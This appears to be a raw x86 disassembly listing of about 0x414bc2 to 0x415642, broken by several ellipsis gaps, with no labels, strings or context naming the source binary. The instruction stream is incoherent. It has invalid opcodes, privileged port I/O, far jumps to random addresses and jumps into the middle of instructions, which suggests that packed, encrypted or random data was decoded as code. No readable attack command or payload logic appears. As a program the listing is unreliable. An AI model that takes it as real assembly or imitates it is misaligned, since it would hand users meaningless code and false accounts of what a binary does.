  414bc2:	gs inc edx
  414bc4:	inc    esi
  414bc5:	jne    0x414c3a
  414bc7:	cs lahf 
  414bc9:	xor    ebp,DWORD PTR [edi]
  414bcb:	retf   0xf7e5
  414bce:	mov    ds:0x54ea7985,eax
  414bd3:	push   edx
  414bd4:	mov    ah,0x31
  414bd6:	ja     0x414c0a
  414bd8:	add    eax,0xa1576052
  414bdd:	mov    ah,0x4
  414bdf:	rcr    DWORD PTR [esi],cl
  414be1:	ins    BYTE PTR es:[edi],dx
  414be2:	jp     0x414b79
  414be4:	adc    DWORD PTR [edi+0x4],esp
  414be7:	test   DWORD PTR [ecx],0x2ae7067c
  414bed:	lods   al,BYTE PTR ds:[esi]
  414bee:	call   DWORD PTR [ecx-0x29f6fd13]
  414bf4:	out    dx,al
  414bf5:	mov    es,esi
  414bf7:	mov    ds:0xe2489759,eax
  414bfc:	inc    edx
  414bfd:	mov    esp,0xf8ea689a
  414c02:	sub    BYTE PTR [ebx-0x18d671d1],al
  414c08:	in     al,0x54
  414c0a:	pop    ss
  414c0b:	xor    cl,BYTE PTR [edx+edx*1+0x52]
  414c0f:	add    eax,0x6934a8db
  414c14:	and    al,0xd7
  414c16:	cmp    bl,BYTE PTR [esi+eax*8]
  414c19:	jg     0x414c5b
  414c1b:	jg     0x414c77
  414c1d:	xchg   esp,eax
  414c1e:	mov    eax,0xd9f74877
  414c23:	inc    ebx
  414c24:	mov    WORD PTR [ecx+0x59c19083],fs
  414c2a:	push   ebp
  414c2b:	cmp    al,al
  414c2d:	out    dx,al
  414c2e:	sub    esi,DWORD PTR [edi]
  414c30:	inc    edx
  414c31:	dec    ebx
  414c32:	in     eax,dx
  414c33:	push   esp
  414c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c35:	sar    DWORD PTR [ecx-0x7f],cl
  414c38:	stos   DWORD PTR es:[edi],eax
  414c39:	into   
  414c3a:	ss jmp 0x414c29
  414c3d:	aam    0x91
  414c3f:	data16 scas al,BYTE PTR es:[edi]
  414c41:	lahf   
  414c42:	mov    ecx,0x9e2375f0
  414c47:	outs   dx,BYTE PTR ds:[esi]
  414c48:	and    BYTE PTR [ebp-0x5b0c0a6c],ch
  414c4e:	xchg   ebx,eax
  414c4f:	fistp  WORD PTR [esi-0x53]
  414c52:	mov    bh,BYTE PTR [ecx-0x430735b2]
  414c58:	aaa    
  414c59:	xchg   edi,eax
  414c5a:	cld    
  414c5b:	jb     0x414c1a
  414c5d:	and    cl,BYTE PTR [eax]
  414c5f:	mov    eax,DWORD PTR [edi-0x3e1a0ac2]
  414c65:	lods   eax,DWORD PTR ds:[esi]
  414c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c67:	xchg   al,bh
  414c69:	data16 das 
  414c6b:	sbb    dh,BYTE PTR [ecx]
  414c6d:	xor    eax,0x0
	...
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    edx,DWORD PTR cs:[ebx+0x6703f5c9]
  414ce7:	loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR [ebx-0x13],dh
  414cf0:	xchg   DWORD PTR [edx],edx
  414cf2:	dec    eax
  414cf3:	adc    BYTE PTR [eax+0x2c],cl
  414cf6:	arpl   WORD PTR [esi+0x27],bx
  414cf9:	fsub   QWORD PTR [edi+0x76]
  414cfc:	sub    al,dh
  414cfe:	xor    DWORD PTR [ebp-0x22eb8e18],eax
  414d04:	rol    DWORD PTR [ebx+0x4],cl
  414d07:	pop    esi
  414d08:	ja     0x414c8a
  414d0a:	mov    ecx,0x94f35ae5
  414d0f:	mov    ds:0x2a06920f,eax
  414d14:	add    ebp,DWORD PTR [ecx+0x7ed5c1a5]
  414d1a:	jns    0x414ca2
  414d1c:	data16 and al,0x8d
  414d1f:	push   ebp
  414d20:	out    0xd,al
  414d22:	imul   eax,DWORD PTR [edx],0x88868f9b
  414d28:	xchg   edx,eax
  414d29:	dec    esi
  414d2a:	stos   BYTE PTR es:[edi],al
  414d2b:	jl     0x414d78
  414d2d:	enter  0xa2aa,0x6c
  414d31:	imul   ebx,DWORD PTR [esi-0x13],0x12b1618b
  414d38:	xor    dl,BYTE PTR [edx-0x40]
  414d3b:	jg     0x414cd1
  414d3d:	pop    ds
  414d3e:	enter  0xde33,0x32
  414d42:	test   al,0x9a
  414d44:	or     ah,BYTE PTR [ebx+eiz*8-0x430cea54]
  414d4b:	inc    esp
  414d4c:	in     eax,dx
  414d4d:	rol    esp,1
  414d4f:	xor    BYTE PTR [edx],bh
  414d51:	ins    DWORD PTR es:[edi],dx
  414d52:	push   ecx
  414d53:	pop    ebx
  414d54:	jns    0x414dc8
  414d56:	inc    ecx
  414d57:	not    BYTE PTR [edx+esi*1]
  414d5a:	and    al,0xdb
  414d5c:	retf   0xb76e
  414d5f:	xchg   ecx,eax
  414d60:	push   ebx
  414d61:	mov    ch,0x27
  414d63:	dec    si
  414d65:	sub    DWORD PTR [eax+0x22],esi
  414d68:	dec    ebp
  414d69:	cmp    bh,BYTE PTR [ebp+0x5c]
  414d6c:	fbld   TBYTE PTR [ecx+0x64]
  414d6f:	test   eax,0xe362d330
  414d74:	dec    edi
  414d75:	mov    edx,ecx
  414d77:	(bad)  
  414d78:	sub    DWORD PTR ds:0x3913b75e,esp
  414d7e:	fmul   QWORD PTR [edi+0x28]
  414d81:	rcl    edi,cl
  414d83:	mov    es,WORD PTR [esi-0x5b]
  414d86:	jbe    0x414dbf
  414d88:	mov    al,0x63
  414d8b:	inc    ebx
  414d8c:	lods   eax,DWORD PTR ds:[esi]
  414d8d:	sbb    DWORD PTR [esi+eax*4],edx
  414d90:	das    
  414d91:	mov    ?,WORD PTR [edi+0x13dfc891]
  414d97:	pusha  
  414d98:	push   eax
  414d99:	push   0xbe23824
  414d9e:	ficomp WORD PTR [eax]
  414da0:	jno    0x414d8e
  414da2:	sahf   
  414da3:	(bad)  
  414da4:	icebp  
  414da5:	push   cs
  414da6:	daa    
  414da7:	mov    dh,0xcb
  414da9:	push   edi
  414daa:	pop    eax
  414dab:	popa   
  414dac:	push   cs
  414dad:	mov    esp,0xcee8ca1f
  414db2:	pusha  
  414db3:	ret    0xeb94
  414db6:	xchg   al,cl
  414db8:	daa    
  414db9:	inc    ebp
  414dba:	mov    ebx,0xf9a8d27d
  414dbf:	sub    al,0x6b
  414dc1:	xchg   esp,eax
  414dc2:	pop    ds
  414dc3:	or     eax,0x55a15228
  414dc8:	and    eax,0x357e4c15
  414dcd:	jae    0x414d92
  414dcf:	push   ebp
  414dd0:	cmp    al,0xae
  414dd2:	bound  edx,QWORD PTR [edi+0x41900d5a]
  414dd8:	or     eax,0xff2ab1e3
  414ddd:	ss jb  0x414d9f
  414de0:	cmp    ch,bl
  414de2:	push   gs
  414de4:	aad    0x6c
  414de6:	mov    al,0xa3
  414de8:	ja     0x414d9c
  414dea:	fiadd  WORD PTR [ebx+0xf3b7]
	...
  414e54:	add    BYTE PTR [eax],al
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x4d325ea9
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [eax],cl
  414e6f:	push   esp
  414e70:	icebp  
  414e71:	out    0x31,eax
  414e73:	mul    DWORD PTR [esi+edi*4-0x783158f1]
  414e7a:	(bad)  
  414e7c:	rcl    BYTE PTR [esi+0x53d81128],0xc3
  414e83:	mov    esp,0xd7f00ca1
  414e88:	adc    al,0x1f
  414e8a:	sahf   
  414e8b:	pop    esp
  414e8c:	por    mm0,QWORD PTR [esi-0x1402a3b8]
  414e93:	sti    
  414e94:	dec    ebp
  414e96:	jge    0x414e48
  414e98:	or     al,0x2
  414e9a:	addr16 cmp al,0x50
  414e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e9e:	pop    ecx
  414e9f:	adc    DWORD PTR [eax+0x29],0x22577ffc
  414ea6:	ret    0x673b
  414ea9:	jg     0x414e9b
  414eab:	push   edi
  414eac:	xchg   dh,dh
  414eae:	mov    ebp,0xa7aed071
  414eb3:	mov    ah,0x74
  414eb5:	cmp    al,0x2a
  414eb7:	jae    0x414f18
  414eb9:	pop    esi
  414eba:	pop    ss
  414ebb:	ret    0x2cc0
  414ebe:	addr16 cmp eax,0xee1295ea
  414ec4:	and    cl,BYTE PTR [ebp-0x4c]
  414ec7:	shr    esp,1
  414ec9:	push   edx
  414eca:	ret    
  414ecb:	and    al,bh
  414ecd:	(bad)  
  414ece:	neg    BYTE PTR [eax+0x59ee1082]
  414ed4:	xchg   edx,eax
  414ed5:	adc    DWORD PTR [edi],0xffffff86
  414ed8:	sub    bh,BYTE PTR [ebx*4+0x6260125c]
  414edf:	mov    ds:0x8aa02e6e,al
  414ee4:	mov    DWORD PTR [ecx+0x7f],ebp
  414ee7:	aad    0xa3
  414ee9:	ficomp DWORD PTR [eax-0x2891208e]
  414eef:	repnz mov esi,0x21bc2c9f
  414ef5:	lock mov gs,WORD PTR [edx]
  414ef8:	das    
  414ef9:	sar    DWORD PTR [ebx],0x51
  414efc:	iret   
  414efd:	xchg   edi,eax
  414efe:	mov    ds:0x8f9993b1,eax
  414f03:	jnp    0x414ed5
  414f05:	shl    BYTE PTR [ebp-0x7a60c15f],0xff
  414f0c:	mov    es,WORD PTR [ecx+0x54]
  414f0f:	mov    al,ds:0xdfc90183
  414f14:	fdivr  DWORD PTR [ebx-0x2453d11c]
  414f1a:	lds    eax,FWORD PTR [ebp+0x758b77e3]
  414f20:	stc    
  414f21:	stos   DWORD PTR es:[edi],eax
  414f22:	or     eax,0x1623b88f
  414f27:	test   al,0x9b
  414f29:	add    eax,0xfdc27b6c
  414f2e:	test   BYTE PTR [edi+0x9],ah
  414f31:	xchg   ebx,eax
  414f32:	mov    fs,WORD PTR [ebx+0x1623b505]
  414f38:	es push esi
  414f3a:	sub    DWORD PTR [edx],edx
  414f3c:	dec    esp
  414f3d:	jnp    0x414f20
  414f3f:	das    
  414f40:	jmp    0x686ba0eb
  414f45:	jne    0xfec54aeb
  414f4b:	cmc    
  414f4c:	push   ecx
  414f4d:	outs   dx,DWORD PTR ds:[esi]
  414f4e:	enter  0x324c,0xf0
  414f52:	push   ss
  414f53:	pop    es
  414f54:	and    cl,BYTE PTR [esi+0x48]
  414f57:	and    ebp,esi
  414f59:	jmp    0x414f4a
  414f5b:	in     al,dx
  414f5c:	mov    eax,0x2fbf5947
  414f61:	mov    DWORD PTR [eax+0x5b70a21a],esi
  414f67:	out    dx,eax
  414f68:	fadd   DWORD PTR [esi-0x274fb64c]
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x9e2c4347
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	sub    dl,ch
  414ff0:	adc    cl,BYTE PTR [esi-0x6bf994d]
  414ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ff7:	add    cl,0xbd
  414ffa:	mov    bl,0xae
  414ffc:	mov    eax,ds:0x6d1b4b86
  415001:	sar    ebx,cl
  415003:	dec    ebp
  415004:	or     al,0x39
  415006:	(bad)  
  415007:	xor    al,cl
  415009:	pop    eax
  41500a:	dec    ebx
  41500b:	sbb    esi,0x4c73e26d
  415011:	int3   
  415012:	mov    dh,0x93
  415014:	mov    cl,0xc5
  415016:	jo     0x414f9e
  415018:	dec    ecx
  415019:	push   ebp
  41501a:	pop    ebx
  41501b:	and    esi,DWORD PTR [ebx-0x11]
  41501e:	push   0x7f
  415020:	mov    ?,esi
  415022:	mov    eax,0xa63d1353
  415027:	mov    ecx,0xcfb03850
  41502c:	add    eax,0x35a21c9e
  415031:	inc    ebp
  415032:	mov    edi,DWORD PTR [ebx-0x6f90ff22]
  415038:	jno    0x415020
  41503a:	cli    
  41503b:	pop    esp
  41503c:	push   ss
  41503d:	cmc    
  41503e:	xor    al,0xcd
  415040:	loopne 0x415017
  415042:	push   es
  415043:	(bad)  
  415044:	xor    bh,dh
  415046:	popa   
  415047:	push   ecx
  415048:	inc    esp
  415049:	jo     0x41508a
  41504b:	repnz pop esi
  41504d:	mov    cl,0xf3
  41504f:	lock sbb esi,DWORD PTR [edi-0x24]
  415053:	jnp    0x4150ca
  415055:	cmp    cl,al
  415057:	stos   DWORD PTR es:[edi],eax
  415058:	ja     0x4150c9
  41505a:	mov    ah,bl
  41505c:	lods   al,BYTE PTR ds:[esi]
  41505d:	dec    ecx
  41505e:	jo     0x415054
  415060:	xchg   edx,ebp
  415062:	sahf   
  415063:	jmp    0x3151:0x2fddc7f8
  41506a:	push   ds
  41506b:	hlt    
  41506c:	js     0x415021
  41506e:	mov    ah,0x1a
  415070:	jmp    0x4150ed
  415072:	sbb    al,0x6c
  415074:	stos   DWORD PTR es:[edi],eax
  415075:	add    DWORD PTR [edi],ebx
  415077:	int    0x6f
  415079:	out    dx,al
  41507a:	and    eax,DWORD PTR [esi+0x3800075e]
  415080:	lea    eax,[ebp-0x6d]
  415083:	mov    dh,0xab
  415085:	in     al,dx
  415086:	fsub   DWORD PTR [edx-0x558e4e67]
  41508c:	adc    ecx,DWORD PTR [eax-0x3b]
  41508f:	jg     0x415105
  415091:	xor    DWORD PTR [esi-0x232206ca],edi
  415097:	add    DWORD PTR ds:0xe2b28342,eax
  41509d:	mul    esi
  41509f:	leave  
  4150a0:	mov    eax,ds:0xd571310
  4150a5:	inc    esp
  4150a6:	add    DWORD PTR [edx+edi*1],ebp
  4150a9:	addr16 fsubr st,st(2)
  4150ac:	sub    al,bl
  4150ae:	dec    esp
  4150af:	jo     0x4150e4
  4150b1:	mov    ah,0x13
  4150b3:	daa    
  4150b4:	inc    ebx
  4150b5:	add    DWORD PTR [ebx],eax
  4150b7:	inc    esp
  4150b8:	jnp    0x415052
  4150ba:	imul   DWORD PTR [ebp-0x3b]
  4150bd:	or     cl,BYTE PTR [edx-0x10]
  4150c0:	gs in  eax,0x36
  4150c3:	xor    BYTE PTR [esi-0x598fd64f],dh
  4150c9:	not    BYTE PTR [eax+0x9]
  4150cc:	gs fs xor al,0xf7
  4150d0:	int3   
  4150d1:	xor    DWORD PTR [ebx],ebx
  4150d3:	es sahf 
  4150d5:	mov    ds:0x523b17ad,eax
  4150da:	imul   ecx,DWORD PTR [ebx-0x5fa4b8d5],0x7f2e4d94
  4150e4:	lahf   
  4150e5:	mov    cl,0x10
  4150e7:	sar    BYTE PTR [eax-0x29091396],1
  4150ed:	sbb    BYTE PTR [eax],al
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x3b80fc2d
  415164:	mov    WORD PTR [edi+eiz*2],fs
  415167:	jecxz  0x415169
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [edx],cl
  41516f:	ret    0xb7d1
  415172:	popf   
  415173:	fcmovnu st,st(4)
  415175:	sbb    eax,0x68cbc272
  41517a:	in     eax,dx
  41517b:	pop    esi
  41517c:	scas   eax,DWORD PTR es:[edi]
  41517d:	mov    esp,ebx
  41517f:	mov    eax,ds:0x1c37157c
  415184:	jns    0x4151ee
  415186:	mov    esp,0x23c13f3e
  41518b:	jae    0x4151fb
  41518d:	repz in eax,0xf2
  415190:	or     esi,DWORD PTR [eax-0x65a5804f]
  415196:	clc    
  415197:	rcl    BYTE PTR [esi-0x297e6e0f],1
  41519d:	pop    ss
  41519e:	fwait
  41519f:	jns    0x4151a5
  4151a1:	and    ebx,DWORD PTR [ecx]
  4151a3:	mov    ebx,0x3cf402d4
  4151a8:	cmp    bh,BYTE PTR [ecx-0xe6e439b]
  4151ae:	rol    cl,1
  4151b0:	(bad)  
  4151b1:	mul    BYTE PTR [edx]
  4151b3:	xchg   esi,ebp
  4151b5:	and    al,BYTE PTR [esi-0x55]
  4151b8:	pop    ecx
  4151b9:	std    
  4151ba:	je     0x41521a
  4151bc:	gs jo  0x41514c
  4151bf:	cs aaa 
  4151c1:	mov    al,ds:0x5ac09033
  4151c6:	xor    BYTE PTR [ecx],al
  4151c8:	mov    dl,0x96
  4151ca:	frstor [edi+0x3765a2cc]
  4151d0:	test   eax,0x56c2fb0
  4151d5:	je     0x415241
  4151d7:	pop    eax
  4151d8:	xor    DWORD PTR [eax+0x6449c077],0x54
  4151df:	pop    esp
  4151e0:	les    edx,FWORD PTR [ebp+0x6e]
  4151e3:	lea    esi,ds:[edi+0x7f]
  4151e7:	scas   al,BYTE PTR es:[edi]
  4151e8:	lock sbb BYTE PTR [eax],cl
  4151eb:	hlt    
  4151ec:	loop   0x415235
  4151ee:	leave  
  4151ef:	(bad)  
  4151f0:	ins    DWORD PTR es:[edi],dx
  4151f1:	bound  edi,QWORD PTR [eax-0x24fd41fc]
  4151f7:	xchg   ebx,eax
  4151f8:	test   BYTE PTR [edx],0x57
  4151fb:	in     al,dx
  4151fc:	ins    BYTE PTR es:[edi],dx
  4151fd:	dec    edi
  4151fe:	pop    edi
  4151ff:	jno    0x415217
  415201:	mov    eax,ds:0xf8b51a50
  415206:	pop    esp
  415207:	pop    esi
  415208:	fistp  WORD PTR [ebp-0x19fb8085]
  41520e:	int    0xc8
  415210:	sar    DWORD PTR [ebx-0x486adb1f],0x2b
  415217:	out    dx,eax
  415218:	aas    
  415219:	mov    ah,0xef
  41521b:	xchg   ebp,eax
  41521c:	stc    
  41521d:	into   
  41521e:	jge    0x415263
  415220:	push   esp
  415221:	dec    edx
  415222:	mov    bh,0x61
  415224:	sar    BYTE PTR [edx+ecx*2+0x3d],1
  415228:	jbe    0x415253
  41522a:	mov    ds:0x6be6fd9f,eax
  41522f:	lock xor al,0x4b
  415232:	mov    WORD PTR gs:[edi+0x3b],fs
  415236:	and    edi,DWORD PTR [ecx+0x3c062d71]
  41523c:	je     0x4152bc
  41523e:	aad    0x4
  415240:	mov    BYTE PTR [eax],cl
  415242:	in     eax,dx
  415243:	stos   BYTE PTR es:[edi],al
  415244:	push   edi
  415245:	in     eax,0xe2
  415247:	push   esp
  415248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415249:	inc    ebx
  41524a:	and    ebp,DWORD PTR [eax]
  41524c:	aam    0xd3
  41524e:	push   ds
  41524f:	dec    ebx
  415250:	mov    ebx,DWORD PTR [edi-0x6d]
  415253:	cwde   
  415254:	repnz or ch,BYTE PTR [edx-0x49cf335e]
  41525b:	inc    eax
  41525c:	jno    0x41521f
  41525e:	xchg   ebp,eax
  41525f:	cmp    eax,0xb0e0880e
  415264:	bound  ebp,QWORD PTR [edi+0x54]
  415267:	mov    ah,0x17
  415269:	push   edi
  41526a:	pop    eax
  41526b:	dec    esi
  41526c:	add    ch,BYTE PTR [ecx+0x0]
	...
  4152d3:	add    BYTE PTR [eax],al
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x5157e50b
  4152e5:	xchg   ecx,eax
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    BYTE PTR [edx],bh
  4152ef:	ret    0xa14f
  4152f2:	or     cl,dh
  4152f4:	xchg   BYTE PTR [eax+ecx*8-0x2],cl
  4152f8:	ss stc 
  4152fa:	repz sahf 
  4152fc:	test   BYTE PTR [eax],0x2d
  4152ff:	mov    ch,0x6c
  415301:	fadd   QWORD PTR [ecx-0x78]
  415304:	(bad)  [ebx+ecx*2]
  415307:	mov    edx,0xe6c83a44
  41530c:	pop    es
  41530d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41530e:	ret    0xe879
  415311:	shl    DWORD PTR [edx+0x79],1
  415314:	mov    ecx,DWORD PTR [ecx-0x7a7b5747]
  41531a:	xor    eax,0x3647f9e0
  41531f:	pop    esi
  415320:	xchg   esi,eax
  415321:	lds    esi,FWORD PTR [esi+ebx*1+0x7f]
  415325:	in     eax,dx
  415326:	retf   0x26a9
  415329:	mov    ebp,0xc7bc48e5
  41532e:	stos   DWORD PTR es:[edi],eax
  41532f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415330:	push   0x22ba65b3
  415335:	jb     0x41533b
  415337:	jmp    0x17bee9bb
  41533c:	hlt    
  41533d:	mov    esi,0x7fc4f36
  415342:	dec    ebp
  415343:	jl     0x415387
  415345:	or     BYTE PTR [ebx-0x2a2dca7b],0x3c
  41534c:	mov    ecx,0xd2fad3ec
  415351:	adc    eax,0x64901273
  415356:	sbb    DWORD PTR [esi+edx*8],0xdb9ca44
  41535d:	(bad)  
  41535e:	sahf   
  41535f:	mov    eax,0x6f063d75
  415364:	stos   BYTE PTR es:[edi],al
  415365:	mov    bh,0x87
  415367:	adc    cl,0x63
  41536a:	ja     0x41539d
  41536c:	fimul  WORD PTR [eax-0x1bc408e8]
  415372:	sbb    BYTE PTR [ebx],cl
  415374:	dec    esi
  415375:	cmp    ch,dh
  415377:	fst    DWORD PTR [esi]
  415379:	fxch   st(3)
  41537b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537c:	pop    ebx
  41537d:	jnp    0x415366
  41537f:	fisttp DWORD PTR [edx+0x16ec678d]
  415385:	scas   al,BYTE PTR es:[edi]
  415386:	pop    edx
  415387:	mov    bl,BYTE PTR [edi-0x750dcd0e]
  41538d:	scas   eax,DWORD PTR es:[edi]
  41538e:	mov    esp,0xe9423b99
  415393:	rcr    DWORD PTR [esi+ebx*4+0x3c],cl
  415397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415398:	mov    eax,ds:0xdfe878cc
  41539d:	mov    esi,DWORD PTR [ecx]
  41539f:	fmul   QWORD PTR [edx-0x170908eb]
  4153a5:	cdq    
  4153a6:	push   ss
  4153a7:	daa    
  4153a8:	pop    ebp
  4153a9:	pop    ss
  4153aa:	pushf  
  4153ab:	push   ss
  4153ac:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4153ae:	and    BYTE PTR [ecx-0x28],dl
  4153b1:	jle    0x4153b2
  4153b3:	cli    
  4153b4:	ret    
  4153b5:	rcl    DWORD PTR [edx+0x7621f8ce],cl
  4153bb:	outs   dx,BYTE PTR ds:[esi]
  4153bc:	sbb    ebx,esi
  4153be:	jbe    0x41543c
  4153c0:	adc    al,0xaf
  4153c2:	aas    
  4153c3:	stc    
  4153c4:	jmp    FWORD PTR [ecx+0x29]
  4153c7:	retf   
  4153c8:	pop    ds
  4153c9:	mov    dh,0x44
  4153cb:	imul   edi,DWORD PTR [ebp+0x7c28676f],0xffffffa9
  4153d2:	fnstenv [edx+0x2e]
  4153d5:	push   eax
  4153d6:	ret    0x556a
  4153d9:	test   BYTE PTR [edx],0xc3
  4153dc:	sbb    ah,ah
  4153de:	iret   
  4153df:	and    cl,BYTE PTR [ebx+0x7fa7ec89]
  4153e5:	pop    ds
  4153e6:	data16 inc sp
  4153e9:	adc    al,0x31
  4153eb:	in     eax,0xa2
  4153ed:	arpl   WORD PTR [eax],ax
	...
  415453:	add    BYTE PTR [eax],al
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x5ed3e5b0
  415463:	sub    BYTE PTR [ebx-0x52],0x67
  415467:	in     eax,0x0
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    BYTE PTR [edx+0x30],al
  415470:	mov    ecx,0x4b6ab292
  415475:	imul   BYTE PTR [esi-0x4e637583]
  41547b:	in     al,0xf5
  41547d:	dec    ebp
  41547e:	addr16 dec esp
  415480:	cmp    al,0xd7
  415482:	sbb    ebx,ebp
  415484:	mov    ebx,0x5c20e049
  415489:	daa    
  41548a:	sub    eax,0xd27803e
  41548f:	add    edi,ecx
  415491:	pop    edx
  415492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415493:	xchg   esi,eax
  415494:	xchg   edi,eax
  415495:	xchg   edi,eax
  415496:	push   esi
  415497:	sbb    DWORD PTR [ebx+eiz*2],ebp
  41549a:	out    dx,al
  41549b:	fwait
  41549c:	add    eax,0x8293cfd1
  4154a2:	inc    esp
  4154a3:	sar    esp,0xb2
  4154a6:	add    BYTE PTR [ebp+0x33b7cb8d],dl
  4154ac:	(bad)
  4154af:	dec    ecx
  4154b0:	jae    0x4154ef
  4154b2:	or     al,0x3b
  4154b4:	jecxz  0x415497
  4154b6:	retf   
  4154b7:	lods   al,BYTE PTR ds:[esi]
  4154b8:	mov    DWORD PTR [ebx],esp
  4154ba:	sbb    eax,0x61c1e651
  4154bf:	add    DWORD PTR [edi+0x18],esi
  4154c2:	fild   QWORD PTR [ebx-0x66c4d008]
  4154c8:	ss cs cmovle esi,ecx
  4154cd:	stc    
  4154ce:	and    DWORD PTR [ebp+0x74f40f3e],edi
  4154d4:	das    
  4154d5:	xchg   esi,eax
  4154d6:	xchg   edi,eax
  4154d7:	pusha  
  4154d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d9:	idiv   BYTE PTR [esi+0x4d17bb57]
  4154df:	sbb    BYTE PTR [ecx+0x7aa392cb],dh
  4154e5:	(bad)  [ebx+0x433a6d1]
  4154eb:	fdivrp st(4),st
  4154ed:	outs   dx,DWORD PTR ds:[esi]
  4154ee:	fwait
  4154ef:	arpl   WORD PTR [edi+0x5d],bx
  4154f2:	or     DWORD PTR [ebx-0x31],0x2a9893ec
  4154f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fa:	jae    0x41552b
  4154fc:	lahf   
  4154fd:	sti    
  4154fe:	sub    ecx,edi
  415500:	adc    dl,bh
  415502:	xchg   esp,eax
  415503:	repnz out 0xea,eax
  415506:	test   eax,0xa0bb6477
  41550b:	pop    edx
  41550c:	stos   BYTE PTR es:[edi],al
  41550d:	or     DWORD PTR [ecx-0x2ecce703],edi
  415513:	push   ebx
  415514:	outs   dx,BYTE PTR ds:[esi]
  415515:	mov    dl,0x29
  415517:	not    BYTE PTR [ebx]
  415519:	cli    
  41551a:	xchg   esp,eax
  41551b:	rcr    BYTE PTR [edi-0x22],0x17
  41551f:	push   esp
  415520:	rcl    BYTE PTR [ebp+0x40c90ecd],0x39
  415527:	xlat   BYTE PTR ds:[ebx]
  415528:	xchg   ecx,eax
  415529:	ror    BYTE PTR [eax+0x3b],0x3e
  41552d:	mov    ebp,0x78cd344c
  415532:	sbb    bl,BYTE PTR [edi-0x11]
  415535:	sub    esi,DWORD PTR [eax+0x1]
  415538:	in     al,dx
  415539:	in     al,0x24
  41553b:	es mov ch,0xa
  41553e:	inc    ebp
  41553f:	in     al,dx
  415540:	ja     0x41557d
  415542:	add    eax,0x19503fd3
  415547:	cmc    
  415548:	push   esp
  415549:	pop    ss
  41554a:	cmp    esp,0xa4b80b08
  415550:	and    BYTE PTR [ecx+0x10],0x1a
  415554:	popa   
  415555:	enter  0x7e6f,0x83
  415559:	mov    bh,0x45
  41555b:	add    DWORD PTR [ebx+0x79],0xffffff84
  41555f:	or     bh,dl
  415561:	int    0xa8
  415563:	daa    
  415564:	jl     0x415536
  415566:	sbb    edx,edi
  415568:	mov    al,0xc7
  41556a:	fnstenv [edi+0x26]
  41556d:	retf   
	...
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x41562a
  4155e3:	cmp    DWORD PTR [ebp-0x4f],ecx
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR [edi-0x16],ch
  4155f0:	xchg   edx,eax
  4155f1:	inc    esp
  4155f2:	sbb    DWORD PTR [esi+0x1aae3aa7],eax
  4155f8:	int3   
  4155f9:	xchg   esi,eax
  4155fa:	out    dx,al
  4155fb:	js     0x4155b9
  4155fd:	ret    0xe7ca
  415600:	(bad)  
  415601:	cli    
  415602:	pop    edi
  415603:	adc    eax,esi
  415605:	das    
  415606:	andps  xmm1,XMMWORD PTR [edi+eiz*2+0x400ebc4a]
  41560e:	stos   BYTE PTR es:[edi],al
  41560f:	loopne 0x4155a6
  415611:	call   0x6a18:0x2ae97f12
  415618:	lea    eax,[ebp+0x77]
  41561b:	push   ecx
  41561c:	cmp    BYTE PTR [edi+0x33],bl
  41561f:	scas   al,BYTE PTR es:[edi]
  415620:	jne    0x41568c
  415622:	jmp    0x367874f2
  415627:	ror    DWORD PTR [edx-0x60],1
  41562a:	test   DWORD PTR [ebx-0x1457f7aa],eax
  415630:	xchg   ebx,eax
  415631:	data16 fisubr WORD PTR [esi-0x4b]
  415635:	fiadd  WORD PTR [edx]
  415637:	popa   
  415638:	mov    bh,0x53
  41563a:	cmp    esp,esi
  41563c:	adc    bl,BYTE PTR [ecx-0x3a20016c]
  415642:	dec    ch
